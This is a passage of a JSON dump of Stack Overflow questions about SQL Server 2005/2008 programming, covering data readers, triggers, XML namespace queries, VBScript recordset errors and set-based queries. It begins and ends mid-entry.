System.Web.UI.Control.OnLoad(EventArgs e) +99\n   System.Web.UI.Control.LoadRecursive() +50\n   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +627\n\n\n\n\n--------------------------------------------------------------------------------\nVersion Information: Microsoft .NET Framework Version:2.0.50727.5456; ASP.NET Version:2.0.50727.5456 \n</code></pre>\n\n<p>Why isn't the SqlDataReader being deallocated correctly?</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008"],"answer_count":3,"favorite_count":9,"up_vote_count":11,"down_vote_count":0,"view_count":27707,"score":11,"question_id":7048839,"title":"SQL Server query to find all permissions/access for all users in a database","body":"<p>I would like to write a query on a sql 2008 that will report all the users that have access to a specific database, or objects within the database such as tables, views, and stored procedures, either directly or due to roles, etc.  This report would be used for security auditing purposes.  Not sure if anyone has a query that will fit my needs completely, but hopefully something that will give me a good start. Either sql 2008, 2005 or 2000 will do, I can probably convert as needed.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2000","queryanalyzer"],"answer_count":6,"favorite_count":0,"up_vote_count":6,"down_vote_count":3,"view_count":1204,"score":3,"question_id":927102,"title":"SQL Server: How to abort a series of batches in Query Analyzer?","body":"<p>i have a series of T-SQL statements separated by the special Query Analyzer batch separator keyword:</p>\n\n<pre><code>GO\n</code></pre>\n\n<p>If one batch fails, i need Query Analyzer to not try subsequent batches - i want it to stop processing the series of batches.</p>\n\n<p>For example:</p>\n\n<pre><code>PRINT 'This runs'\ngo\n\nSELECT 0/0, 'This causes an error'\ngo\n\nPRINT 'This should not run'\ngo\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>This runs\nServer: Msg 8134, Level 16, State 1, Line 2\nDivide by zero error encountered.\nThis should not run\n</code></pre>\n\n<p>Possible?</p>\n\n<p><hr /></p>\n\n<h2>Update</h2>\n\n<p>An example of this in real use might be:</p>\n\n<pre><code> sp_rename 'Shelby', 'Kirsten'\n go\n\n DROP VIEW PeekAView\n go\n\n CREATE VIEW PeekAViewAS \n SELECT * FROM Kirsten\n go\n</code></pre>\n"},{"tags":["sql-server-2008","sql-server-2005","sql-server-2000"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":112,"score":0,"question_id":10359199,"title":"SQL Server 2000,2005,2008 compatibility","body":"<p>How should I write code so that I can run it on every version?</p>\n\n<p>If I developed the code on SQL Server 2008, can I run the same code without making any changes in 2000 and 2005?</p>\n\n<p>Let's say multiple insert in a single insert statement are possible in 2008 but not in 2005 &amp; 2000.</p>\n\n<p>Can I run the same code in 2005 &amp; 2000 ?</p>\n\n<p>Here is the code:</p>\n\n<pre><code>create table MergeMe (\nid int identity(1,1),\nSname varchar(100),\ndtDate datetime default getdate(),\n)\ninsert into MergeMe values('Vikrant More',null),('Shrikant Gavli',null),('Saurabh Yete',null)\n</code></pre>\n"},{"tags":["asp.net","xml","visual-studio-2010","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":521,"score":0,"question_id":10714535,"title":"Read XML from String","body":"<p>I have data in XML format. I stored it in varchar datatype column. I have retrieved it by using Linq to sql in visual studio 2010. I got xml format data in string variable. now i need read it as a Xml. I need to take value in particular node.</p>\n\n<pre><code>for example,\n&lt;Sale&gt;\n&lt;LTV&gt;150&lt;/LTV&gt;\n&lt;CLTV&gt;350&lt;/CLTV&gt;\n&lt;DLTV&gt;600&lt;/DLTV&gt;\n&lt;/sale&gt;\n</code></pre>\n\n<p>I NEED TO TAKE CLTV value.</p>\n"},{"tags":["c#","asp.net",".net","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":216,"score":1,"question_id":10712055,"title":"SQL server and .NET memory constraints, allocations, and garbage collection","body":"<p>I am running .NET 3.5 (C#) and SQL Server 2005 (for our clients).  The code that we run does some regression math and is a little complicated.  I get the following error when I run multiple pages on our site:</p>\n\n<pre><code>.NET Framework execution was aborted by escalation policy because of out of memory. \nSystem.InvalidOperationException: There is already an open DataReader associated with this Command which must be closed first.\nSystem.InvalidOperationException: \n</code></pre>\n\n<p>I'm trying to figure out what is the root cause of this: is it a database issue or my C## code? or is it concurrency with locks when running queries? or somethin else?</p>\n\n<p>The code is erroring here:</p>\n\n<pre><code>erver.ScriptTimeout = 300;\n        string returnCode = string.Empty;\n        using (SqlConnection connection = new SqlConnection(ConfigurationManager.ConnectionStrings[\"MainDll\"].ToString())) {\n            connection.Open();\n            using (SqlCommand command = new SqlCommand(sql.ToString(), connection)) {\n                command.CommandType = CommandType.Text;\n                command.CommandTimeout = 300;\n                returnCode = (string)command.ExecuteScalar();\n                //Dispose();\n            }\n            //Dispose();\n        }\n</code></pre>\n\n<p>Our contractor wrote a bunch of code to help with SQL connections in an App_Code/sqlHelper.s file. Some of them are like this:</p>\n\n<pre><code>public static SqlDataReader GetDataReader(string sql, string connectionString, int connectionTime) {\n        lock (_lock) {\n            SqlConnection connection = null;\n            try {\n                connection = GetConnection(connectionString);\n                //connection.Open();\n                using (SqlCommand cmd = new SqlCommand(sql, connection)) {\n                    cmd.CommandTimeout = connectionTime;\n                    WriteDebugInfo(\"GetDataReader\", sql);\n                    return cmd.ExecuteReader(CommandBehavior.CloseConnection);\n                }\n            }\n            catch (Exception e) {\n                if (connection != null)\n                    connection.Dispose();\n                throw new DataException(sql, connectionString, e);\n            }\n\n        }\n    }\n</code></pre>\n\n<p>Should there be some deallocation of memory somewhere?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":10705097,"title":"What am I doing wrong SQL query pulls null records","body":"<p>When I run this condition</p>\n\n<pre><code>and A.[ID] = @ID\nand \n(\n    (datediff(dd, startDate, B.MeterStart) &lt; 0) /* flaw in start date */\n    or \n    (\n        (A.[End Date] is not null) \n        and (B.MeterEnd &gt; A.[End Date]) /* flaw in end date */\n    )\n) \n</code></pre>\n\n<p>I pull both where there is problem in start date and those which has null end date. Why is it so? I am specifically applying <code>(A.[End Date] is not null)</code> to make sure null end dates are not pulled.</p>\n\n<p>output result (snippet)</p>\n\n<pre><code>Amount  [End Date]  \n1316    30-Jun-11\n1316    NULL\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","vbscript","oledb"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":277,"score":0,"question_id":10706463,"title":"Row handle referred to a deleted row or a row marked for deletion","body":"<p>We have an old site that is giving us an error. It uses VBScript and the DB is SQL Server 2005.</p>\n\n<p>Here is the code:</p>\n\n<pre><code>set oNotes = server.CreateObject(\"SCRIPTING.DICTIONARY\")\n\nopenSQL \"SELECT * FROM v_client_notes WHERE contact_id = \" &amp;_\n    my_contactID &amp; \" ORDER BY client_notes_duedate ASC\"\n\ndo while rs.eof = false\n    set temp = server.CreateObject(\"SCRIPTING.DICTIONARY\")\n    load_rs temp, rs\n    set oNotes(trim(rs(\"client_notes_id\"))) = temp\n    rs.movenext'error on this line\nloop\n</code></pre>\n\n<p>Error:</p>\n\n<blockquote>\n  <p>Microsoft OLE DB Provider for SQL Server error '80040e23'</p>\n  \n  <p>Row handle referred to a deleted row or a row marked for deletion.</p>\n</blockquote>\n\n<p>This error does not happen all the time, just for record sets returned with certain contact_id's. Haven't been able to pinpoint the difference in the ones that work and the ones that don't.</p>\n\n<p>As you can see the error happens on rs.movenext.</p>\n\n<p>I have made sure that the table has a primary key (client_notes_id).</p>\n\n<p>Thank you for your help!</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>Here is the code for load_rs:</p>\n\n<pre><code>function load_rs(dict,Byref record)\n    for each thing_record in record.fields\n        dict(thing_record.name) = trim(thing_record.value)\n    next\nend function\n</code></pre>\n\n<p>Here is the update script. This is on a separate page that I post to (kinda AJAX style):</p>\n\n<pre><code>If request(\"client_notes\") &lt;&gt; \"\" then\n        client_notes_subject = request(\"client_notes_subject\")\n        client_notes_postedby = session(\"user\") \n        client_notes_duedate = request(\"client_notes_duedate\")\n        if client_notes_duedate = \"\" then\n            client_notes_duedate = NULL\n        end if\n        client_notes_date_entered = request(\"client_notes_date_entered\")\n        client_notes =  request(\"client_notes\")\n        if isnumeric(request(\"contactID\")) then contact_id = request(\"contactID\")\n        if clientnotes_id=\"\" then clientnotes_id=\"0\"\n        openSQL(\"SELECT * FROM client_notes WHERE client_notes_id=\" &amp; clientnotes_id)\n        if rs.EOF then\n            openSQL(\"SELECT newid()\")\n            client_notes_guid = rs(0)\n            openSQL(\"select * from client_notes\")\n            rs.addnew\n        else\n            client_notes_guid = rs(\"guid\")\n            rs.update\n        end if \n\n        rs(\"contact_id\") = contact_id   \n        rs(\"client_notes_subject\") = client_notes_subject\n        rs(\"client_notes_postedby\") = session(\"user\")\n        'if client_notes_duedate &lt;&gt; Null then\n        rs(\"client_notes_duedate\") = client_notes_duedate \n        'end if\n        rs(\"client_notes_date_entered\") = client_notes_date_entered\n        rs(\"client_notes\") = client_notes\n        rs(\"guid\")=client_notes_guid\n        rs.update\n\n        'if client_notes_duedate = Null then \n        '   sqlSetNullnotes = \"UPDATE client_notes SET client_notes_duedate = NULL WHERE client_notes_id=\" &amp; clientnotes_id\n        '   opensql sqlSetNullnotes\n        'end if\n\n        next_due_date = request(\"next_due_date\")\n        if next_due_date = \"\" then\n            next_due_date = NULL\n        end if\n\n        openSQL(\"SELECT * FROM \" &amp; MainContactsDB &amp; \" WHERE Contact_ID=\" &amp; contactID)\n        rs(\"Last_Contact_Date\") = client_notes_date_entered\n        rs(\"Next_Contact_Date\") = next_due_date\n        rs.update\n    end if\n</code></pre>\n\n<p>openSQL method:</p>\n\n<pre><code>Set rs = Server.CreateObject(\"ADODB.Recordset\")\nfunction openSQL(SQLrs)\n    if rs.state = 1 then rs.close\n    'response.write sqlRS\n    rs.Open SQLrs, conn, 3, 3\nend function\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","loops"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":385,"score":0,"question_id":10707933,"title":"Set-based alternative to loop in SQL Server","body":"<p>I know that there are several posts about how BAD it is to try to loop in SQL Server in a stored procedure.  But I haven't quite found what I am trying to do.  We are using data connectivity that can be linked internally directly into excel.  </p>\n\n<p>I have seen some posts where a few people have said they could convert most loops to a standard query.  But for the life of me I am having trouble with this one.  </p>\n\n<p>I need all <code>custID</code>s who have orders right before an event of type 38,40.  But only get them if there is no other order between the event and the order in the first query.</p>\n\n<p>So there are 3 parts.  I first query for all orders (orders table) based on a time frame into a temporary table.  </p>\n\n<pre><code>Select into temp1 odate, custId from orders where odate&gt;'5/1/12'\n</code></pre>\n\n<p>Then I could use the temp table to inner join on the secondary table to get a customer event (LogEvent table) that may have occurred some time in the past prior to the current order.  </p>\n\n<pre><code>Select into temp2 eventdate, temp1.custID from LogEvent inner join temp1 on \ntemp1.custID=LogEvent.custID where EventType in (38,40) and temp1.odate&gt;eventdate\norder by eventdate desc\n</code></pre>\n\n<p>The problem here is that the queries I am trying to run will return all rows for each of the customers from the first query where I only want the latest for each customer.  So this is where on the client side I would loop to only get one Event instead of all the old ones.  But as all the query has to run inside of Excel I can't really loop client side.</p>\n\n<p>The third step then could use the results from the second query to make check if the event occurred between most current order and any previous order.  I only want the data where the event precedes the order and no other orders are in between.</p>\n\n<pre><code>Select ordernum, shopcart.custID from shopcart right outer join temp2 on \nshopcart.custID=temp2.custID where shopcart.odate &gt;= temp2.eventdate and\nordernum is null\n</code></pre>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":42,"score":0,"question_id":10707730,"title":"Executing a trigger; updating another field","body":"<p>I have been reading up on triggers, and I don't seem to be finding an example, that handles my situation. My situation is unfortunate. The previous DBA scattered redundant data throughout our database. </p>\n\n<p>I'd like to update the company name in multiple other tables once the company name has been changed in my <code>organiz</code> table. I have this, but it doesn't seem to work:</p>\n\n<pre><code>CREATE TRIGGER updOrgNameTrigger\nON organiz\nAFTER UPDATE\nAS\n\nIF UPDATE(Org_Name_1)\nBEGIN\n    DECLARE @org_name varchar(256)\n    SET @org_name = (select Org_Name_1 from organiz)\n    UPDATE other_table set Org_Name_1 = @org_name\n    UPDATE the_other_table set Org_name_1 = @org_name\nEND\n</code></pre>\n\n<p>Is what I am trying to do possible?</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":10700914,"title":"Incorrect syntax","body":"<p>I have a selection of sql code that I keep getting an 'Incorrect syntax' error on.</p>\n\n<p>I cannot see what is causing the issue.</p>\n\n<p>Can anyone point out the obvious to me?  I maybe have been staring at the code for too long to see it now!!</p>\n\n<p>My code is :-  </p>\n\n<pre><code>DECLARE @CostCatID AS Int\n\nSELECT * FROM vwREP_GP_ContractProjectPurchaseRpt\nWHERE PACOSTCATID IN (@CostCatID)\nAND (DOC_DATE &amp;gt;= @DateFrom) \nAND (DOC_DATE  &amp;lt;= @DateTo)\norder by 1\n</code></pre>\n\n<p>and the full error message I get is:-</p>\n\n<blockquote>\n  <p>Incorrect syntax near ';'</p>\n</blockquote>\n\n<p>I know it is going to be obvious to most people but for the life of me in my tired state I cannot get this to work.</p>\n\n<p>Thanks in advance.</p>\n\n<p>(all work is being done in sql Server Management Studio 2005) </p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":10706018,"title":"Complicated Sql Query Of Joining Two Tables","body":"<p>I having Following Two Tables and wants the result date and bank wise. The Example is as below.                     </p>\n\n<pre><code>Table1: Name:- AccountMast                      \ncompanyID   A/CID   Name          BalDR BalCR   \n102         14      SHOBHA        NULL  NULL    \n102         15      SONKI         NULL  NULL    \n102         16      BANK OF INDIA null  12000       \n\nTable2 Name :- DeBank                       \ncompanyID   transID  date        name          particulars  deposit withdrawal\n102         2        12/04/2012  BANK OF INDIA MAHENDRA     1000    NULL\n102         4        15/04/2012  CENTRAL BANK  MAHENDRA     1000    NULL\n102         3        20/05/2012  BANK OF INDIA MAHENDRA     2000    NULL\n\n\nResult                      \nBANK WISE RESULT BANK OF INDIA              \ndate        transID particulars deposit withdrawal  BALANCE \n01/04/2012          BAL B/F                         12000   \n12/04/2012    2     MAHENDRA    1000    NULL        13000 \n20/05/2012    3     MAHENDRA    2000    NULL        15000\n\n\nBANK WISE RESULT CENTRAL BANK OF INDIA              \ndate        transID particulars deposit withdrawal  BALANCE**   \n01/04/2012          BAL B/F             \n15/04/2012   4      MAHENDRA    2000    NULL        2000\n</code></pre>\n\n<p>So what is the sql statement for it?.</p>\n"},{"tags":["sql-server","xml","tsql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":184,"score":2,"question_id":10705222,"title":"struggling with XML namespace nodes query","body":"<p>I'm struggling to get my head around XML namespace query when using XML nodes - I've read other similar questions here and an article <a href=\"http://marcanton.io/blog/the-cheaters-guide-to-mastering-xquery-on-sql-server-part-1/\" rel=\"nofollow\">here</a> but cannot apply this to my specific query.</p>\n\n<p>I have a larger version of this sample XML:</p>\n\n<pre><code>SELECT CAST('&lt;Navigator clsid=\"{ABF8EB05-610D-11D3-A53E-684F745C}\"&gt;\n  &lt;Version&gt;7&lt;/Version&gt;\n  &lt;NavigatorNodes clsid=\"{0484ACB1-78F5-48D7-A26B-3A0ACD3A5F91}\"&gt;\n    &lt;NavigatorNode clsid=\"{59AB61BD-7833-4954-94C2-B6D737E3DD6F}\"&gt;\n      &lt;Indent&gt;0&lt;/Indent&gt;\n      &lt;Caption&gt;Contact&lt;/Caption&gt;\n      &lt;Selected&gt;0&lt;/Selected&gt;\n      &lt;ViewType&gt;0&lt;/ViewType&gt;\n      &lt;ViewSubType&gt;0&lt;/ViewSubType&gt;\n      &lt;ShowTotals&gt;0&lt;/ShowTotals&gt;\n      &lt;RowHeight&gt;0&lt;/RowHeight&gt;\n      &lt;Complement&gt;0&lt;/Complement&gt;\n      &lt;FreezeFirst&gt;0&lt;/FreezeFirst&gt;\n      &lt;a1:QueryFilter xmlns:a2=\"http://www.ascenttechnology.co.uk/schemas/entities\" xmlns:xsi=\"http://www.w3.org/21/XMLSchema-instance\" xmlns:a1=\"http://www.ascenttechnology.co.uk/schemas/services\" Type=\"QueryFilter\"&gt;\n        &lt;entity_name&gt;Contact&lt;/entity_name&gt;\n        &lt;relationship_name /&gt;\n        &lt;relationship_from_entity_name /&gt;\n        &lt;a1:ColumnInfoCollection Type=\"ColumnInfoCollection\" AscentCollection=\"true\"&gt;\n          &lt;__vers&gt;1&lt;/__vers&gt;\n          &lt;IgnoreMissingItem&gt;0&lt;/IgnoreMissingItem&gt;\n          &lt;ReadOnly&gt;0&lt;/ReadOnly&gt;\n          &lt;AllowNulls&gt;0&lt;/AllowNulls&gt;\n          &lt;a1:ColumnInfo Type=\"ColumnInfo\"&gt;\n            &lt;attribute_name&gt;state&lt;/attribute_name&gt;\n            &lt;width&gt;0&lt;/width&gt;\n          &lt;/a1:ColumnInfo&gt;\n          &lt;a1:ColumnInfo Type=\"ColumnInfo\"&gt;\n            &lt;attribute_name&gt;current_address_suffix&lt;/attribute_name&gt;\n            &lt;width&gt;0&lt;/width&gt;\n          &lt;/a1:ColumnInfo&gt;\n        &lt;/a1:ColumnInfoCollection&gt;\n        &lt;a1:SurveyColumnInfoCollection Type=\"AttributeInfoCollection\" AscentCollection=\"true\"&gt;\n          &lt;__vers&gt;1&lt;/__vers&gt;\n          &lt;IgnoreMissingItem&gt;0&lt;/IgnoreMissingItem&gt;\n          &lt;ReadOnly&gt;0&lt;/ReadOnly&gt;\n          &lt;AllowNulls&gt;0&lt;/AllowNulls&gt;\n        &lt;/a1:SurveyColumnInfoCollection&gt;\n        &lt;a1:WorkflowColumnInfoCollection Type=\"AttributeInfoCollection\" AscentCollection=\"true\"&gt;\n          &lt;__vers&gt;1&lt;/__vers&gt;\n          &lt;IgnoreMissingItem&gt;0&lt;/IgnoreMissingItem&gt;\n          &lt;ReadOnly&gt;0&lt;/ReadOnly&gt;\n          &lt;AllowNulls&gt;0&lt;/AllowNulls&gt;\n        &lt;/a1:WorkflowColumnInfoCollection&gt;\n        &lt;a1:ConditionCollection Type=\"ConditionCollection\" AscentCollection=\"true\"&gt;\n          &lt;__vers&gt;1&lt;/__vers&gt;\n          &lt;IgnoreMissingItem&gt;0&lt;/IgnoreMissingItem&gt;\n          &lt;ReadOnly&gt;0&lt;/ReadOnly&gt;\n          &lt;AllowNulls&gt;0&lt;/AllowNulls&gt;\n          &lt;a1:Condition Type=\"Condition\"&gt;\n            &lt;attribute_name&gt;class&lt;/attribute_name&gt;\n            &lt;description1 /&gt;\n            &lt;description2 /&gt;\n            &lt;attribute_id&gt;0&lt;/attribute_id&gt;\n            &lt;not&gt;0&lt;/not&gt;\n            &lt;operator&gt;28&lt;/operator&gt;\n            &lt;value1&gt;1&lt;/value1&gt;\n            &lt;value2 xsi:nil=\"true\" /&gt;\n            &lt;indent_level&gt;0&lt;/indent_level&gt;\n            &lt;value1_is_reference&gt;0&lt;/value1_is_reference&gt;\n            &lt;value2_is_reference&gt;0&lt;/value2_is_reference&gt;\n          &lt;/a1:Condition&gt;\n          &lt;a1:Condition Type=\"Condition\"&gt;\n            &lt;attribute_name&gt;do_not_mail&lt;/attribute_name&gt;\n            &lt;description1 /&gt;\n            &lt;description2 /&gt;\n            &lt;attribute_id&gt;0&lt;/attribute_id&gt;\n            &lt;not&gt;0&lt;/not&gt;\n            &lt;operator&gt;0&lt;/operator&gt;\n            &lt;value1&gt;True&lt;/value1&gt;\n            &lt;value2 xsi:nil=\"true\" /&gt;\n            &lt;indent_level&gt;0&lt;/indent_level&gt;\n            &lt;value1_is_reference&gt;0&lt;/value1_is_reference&gt;\n            &lt;value2_is_reference&gt;0&lt;/value2_is_reference&gt;\n          &lt;/a1:Condition&gt;\n          &lt;a1:Condition Type=\"Condition\"&gt;\n            &lt;attribute_name&gt;gone_away&lt;/attribute_name&gt;\n            &lt;description1 /&gt;\n            &lt;description2 /&gt;\n            &lt;attribute_id&gt;0&lt;/attribute_id&gt;\n            &lt;not&gt;0&lt;/not&gt;\n            &lt;operator&gt;0&lt;/operator&gt;\n            &lt;value1&gt;True&lt;/value1&gt;\n            &lt;value2 xsi:nil=\"true\" /&gt;\n            &lt;indent_level&gt;0&lt;/indent_level&gt;\n            &lt;value1_is_reference&gt;0&lt;/value1_is_reference&gt;\n            &lt;value2_is_reference&gt;0&lt;/value2_is_reference&gt;\n          &lt;/a1:Condition&gt;\n          &lt;a1:Condition Type=\"Condition\"&gt;\n            &lt;attribute_name&gt;dp_opt_out&lt;/attribute_name&gt;\n            &lt;description1 /&gt;\n            &lt;description2 /&gt;\n            &lt;attribute_id&gt;0&lt;/attribute_id&gt;\n            &lt;not&gt;0&lt;/not&gt;\n            &lt;operator&gt;0&lt;/operator&gt;\n            &lt;value1&gt;True&lt;/value1&gt;\n            &lt;value2 xsi:nil=\"true\" /&gt;\n            &lt;indent_level&gt;0&lt;/indent_level&gt;\n            &lt;value1_is_reference&gt;0&lt;/value1_is_reference&gt;\n            &lt;value2_is_reference&gt;0&lt;/value2_is_reference&gt;\n          &lt;/a1:Condition&gt;\n          &lt;a1:Condition Type=\"Condition\"&gt;\n            &lt;attribute_name&gt;deceased&lt;/attribute_name&gt;\n            &lt;description1 /&gt;\n            &lt;description2 /&gt;\n            &lt;attribute_id&gt;0&lt;/attribute_id&gt;\n            &lt;not&gt;0&lt;/not&gt;\n            &lt;operator&gt;0&lt;/operator&gt;\n            &lt;value1&gt;True&lt;/value1&gt;\n            &lt;value2 xsi:nil=\"true\" /&gt;\n            &lt;indent_level&gt;0&lt;/indent_level&gt;\n            &lt;value1_is_reference&gt;0&lt;/value1_is_reference&gt;\n            &lt;value2_is_reference&gt;0&lt;/value2_is_reference&gt;\n          &lt;/a1:Condition&gt;\n          &lt;a1:Condition Type=\"Condition\"&gt;\n            &lt;attribute_name&gt;deleted&lt;/attribute_name&gt;\n            &lt;description1 /&gt;\n            &lt;description2 /&gt;\n            &lt;attribute_id&gt;0&lt;/attribute_id&gt;\n            &lt;not&gt;0&lt;/not&gt;\n            &lt;operator&gt;0&lt;/operator&gt;\n            &lt;value1&gt;True&lt;/value1&gt;\n            &lt;value2 xsi:nil=\"true\" /&gt;\n            &lt;indent_level&gt;0&lt;/indent_level&gt;\n            &lt;value1_is_reference&gt;0&lt;/value1_is_reference&gt;\n            &lt;value2_is_reference&gt;0&lt;/value2_is_reference&gt;\n          &lt;/a1:Condition&gt;\n          &lt;a1:Condition Type=\"Condition\"&gt;\n            &lt;attribute_name&gt;Date_Of_Birth&lt;/attribute_name&gt;\n            &lt;description1 /&gt;\n            &lt;description2 /&gt;\n            &lt;attribute_id&gt;0&lt;/attribute_id&gt;\n            &lt;not&gt;0&lt;/not&gt;\n            &lt;operator&gt;19&lt;/operator&gt;\n            &lt;value1&gt;2010-06-23T::.+:&lt;/value1&gt;\n            &lt;value2 xsi:nil=\"true\" /&gt;\n            &lt;indent_level&gt;0&lt;/indent_level&gt;\n            &lt;value1_is_reference&gt;0&lt;/value1_is_reference&gt;\n            &lt;value2_is_reference&gt;0&lt;/value2_is_reference&gt;\n          &lt;/a1:Condition&gt;\n          &lt;a1:Condition Type=\"Condition\"&gt;\n            &lt;attribute_name&gt;home_address1&lt;/attribute_name&gt;\n            &lt;description1 /&gt;\n            &lt;description2 /&gt;\n            &lt;attribute_id&gt;0&lt;/attribute_id&gt;\n            &lt;not&gt;0&lt;/not&gt;\n            &lt;operator&gt;26&lt;/operator&gt;\n            &lt;value1 xsi:nil=\"true\" /&gt;\n            &lt;value2 xsi:nil=\"true\" /&gt;\n            &lt;indent_level&gt;0&lt;/indent_level&gt;\n            &lt;value1_is_reference&gt;0&lt;/value1_is_reference&gt;\n            &lt;value2_is_reference&gt;0&lt;/value2_is_reference&gt;\n          &lt;/a1:Condition&gt;\n          &lt;a1:Condition Type=\"Condition\"&gt;\n            &lt;attribute_name&gt;home_postcode&lt;/attribute_name&gt;\n            &lt;description1 /&gt;\n            &lt;description2 /&gt;\n            &lt;attribute_id&gt;0&lt;/attribute_id&gt;\n            &lt;not&gt;0&lt;/not&gt;\n            &lt;operator&gt;26&lt;/operator&gt;\n            &lt;value1 xsi:nil=\"true\" /&gt;\n            &lt;value2 xsi:nil=\"true\" /&gt;\n            &lt;indent_level&gt;1&lt;/indent_level&gt;\n            &lt;value1_is_reference&gt;0&lt;/value1_is_reference&gt;\n            &lt;value2_is_reference&gt;0&lt;/value2_is_reference&gt;\n          &lt;/a1:Condition&gt;\n          &lt;a1:Condition Type=\"Condition\"&gt;\n            &lt;attribute_name&gt;home_address1&lt;/attribute_name&gt;\n            &lt;description1 /&gt;\n            &lt;description2 /&gt;\n            &lt;attribute_id&gt;0&lt;/attribute_id&gt;\n            &lt;not&gt;0&lt;/not&gt;\n            &lt;operator&gt;0&lt;/operator&gt;\n            &lt;value1 /&gt;\n            &lt;value2 xsi:nil=\"true\" /&gt;\n            &lt;indent_level&gt;0&lt;/indent_level&gt;\n            &lt;value1_is_reference&gt;0&lt;/value1_is_reference&gt;\n            &lt;value2_is_reference&gt;0&lt;/value2_is_reference&gt;\n          &lt;/a1:Condition&gt;\n          &lt;a1:Condition Type=\"Condition\"&gt;\n            &lt;attribute_name&gt;home_postcode&lt;/attribute_name&gt;\n            &lt;description1 /&gt;\n            &lt;description2 /&gt;\n            &lt;attribute_id&gt;0&lt;/attribute_id&gt;\n            &lt;not&gt;0&lt;/not&gt;\n            &lt;operator&gt;0&lt;/operator&gt;\n            &lt;value1 /&gt;\n            &lt;value2 xsi:nil=\"true\" /&gt;\n            &lt;indent_level&gt;1&lt;/indent_level&gt;\n            &lt;value1_is_reference&gt;0&lt;/value1_is_reference&gt;\n            &lt;value2_is_reference&gt;0&lt;/value2_is_reference&gt;\n          &lt;/a1:Condition&gt;\n        &lt;/a1:ConditionCollection&gt;\n        &lt;a1:OrderByCollection Type=\"OrderByCollection\" AscentCollection=\"true\"&gt;\n          &lt;__vers&gt;1&lt;/__vers&gt;\n          &lt;IgnoreMissingItem&gt;0&lt;/IgnoreMissingItem&gt;\n          &lt;ReadOnly&gt;0&lt;/ReadOnly&gt;\n          &lt;AllowNulls&gt;0&lt;/AllowNulls&gt;\n        &lt;/a1:OrderByCollection&gt;\n        &lt;SelectedArticles xsi:nil=\"true\" /&gt;\n        &lt;groupby_field_name /&gt;\n        &lt;reporting_currency&gt;52&lt;/reporting_currency&gt;\n        &lt;Negate_Filter&gt;0&lt;/Negate_Filter&gt;\n        &lt;Survey_Id&gt;----&lt;/Survey_Id&gt;\n        &lt;Survey_Name xsi:nil=\"true\" /&gt;\n        &lt;Workflow_Id&gt;----&lt;/Workflow_Id&gt;\n        &lt;Workflow_Name xsi:nil=\"true\" /&gt;\n        &lt;XPath&gt;0&lt;/XPath&gt;\n        &lt;locale&gt;0&lt;/locale&gt;\n      &lt;/a1:QueryFilter&gt;\n    &lt;/NavigatorNode&gt;\n  &lt;/NavigatorNodes&gt;\n&lt;/Navigator&gt;' AS XML) as xmldata\n</code></pre>\n\n<p>And have been trying queries to get to the information contained within the a1:Condition Node. I've tried queries such as:</p>\n\n<pre><code>;WITH XMLNAMESPACES(\n'http://www.ascenttechnology.co.uk/schemas/services' AS a1\n,'http://www.ascenttechnology.co.uk/schemas/entities' AS a2\n,DEFAULT 'http://www.w3.org/21/XMLSchema-instance'\n)\nSELECT \n#xmldata.*\n,ref.value('attribute_name[1]','NVARCHAR(50)') as attribute_name\nFROM #xmldata\nCROSS APPLY xmldata.nodes('/Navigator/NavigatorNodes/NavigatorNode/a1:QueryFilter/a1:ConditionCollection/a1:Condition') T(ref)\n</code></pre>\n\n<p>But they're always coming back blank when I get near the namespaced nodes - I'm able to pull data from the nodes all the way up to <code>'/Navigator/NavigatorNodes/NavigatorNode'</code> but then have no luck.</p>\n\n<p>Thanks!</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":10704341,"title":"data is not getting inserted in table using transactions","body":"<p>I am trying to insert some data. It is not getting inserted in the table using transactions. Instead, it is going to the catch block. Below is sql stored  procedure:\n    GO</p>\n\n<pre><code>/****** Object:  StoredProcedure [dbo].[rml_re_GetAndStoreConsumerSubscriptionData_NEWUPS] Script Date: 05/21/2012 12:39:59 ******/\nSET ANSI_NULLS ON\nGO\n\nSET QUOTED_IDENTIFIER ON\nGO\n\n--EXEC rml_re_GetAndStoreConsumerSubscriptionData_NEWUPS\nALTER PROCEDURE [dbo].[rml_re_GetAndStoreConsumerSubscriptionData_NEWUPS]  \n\nAS\nBEGIN  \n DECLARE @currenttime datetime  \n SET @currenttime= getdate()  \n INSERT INTO rml_re_consumerdatasync_log VALUES('rml_re_GetAndStoreConsumerSubscriptionData',@currenttime,null,'started',@currenttime,'',getdate(),null);  \n  BEGIN TRY  \n    BEGIN TRANSACTION PULLCONSUMERDATA  \n        DECLARE @dbServerName VARCHAR(50),@databaseName VARCHAR(50),@dbUserName VARCHAR(50),@query VARCHAR(MAX)    \n        SELECT  @dbServerName=dbservername,@databaseName=dbname,@dbUserName=dbusername FROM rml_re_applications   \n        WHERE id=(SELECT configvalue FROM rml_re_configuration WHERE configname='CRMApplicationID')\n\n        -- Removes all old data before insertion.  \n        ALTER TABLE [dbo].[rml_re_consumermarkets] DROP 